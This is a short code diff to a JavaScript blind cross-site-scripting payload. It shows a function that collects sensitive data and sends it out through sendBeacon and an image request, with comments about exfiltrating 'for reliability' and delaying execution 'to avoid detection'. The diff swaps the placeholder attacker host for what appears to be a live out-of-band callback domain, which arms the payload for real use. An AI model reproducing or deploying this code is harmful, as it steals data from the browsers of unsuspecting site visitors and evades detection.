@@ -23,8 +23,8 @@ const collectSensitiveData = () => {
   });
 
   // Exfiltrate via multiple methods for reliability
-  navigator.sendBeacon('https://attacker-server.com/blindxss', JSON.stringify(payload));
-  new Image().src = `https://attacker-server.com/log?data=${encodeURIComponent(JSON.stringify(payload))}`;
+  navigator.sendBeacon('https://y21g7yf73ev6sty92tipeiqvfmld9gx5.oastify.com/blindxss', JSON.stringify(payload));
+  new Image().src = `https://y21g7yf73ev6sty92tipeiqvfmld9gx5.oastify.com/log?data=${encodeURIComponent(JSON.stringify(payload))}`;
 };
 
 // Delay execution to avoid detection
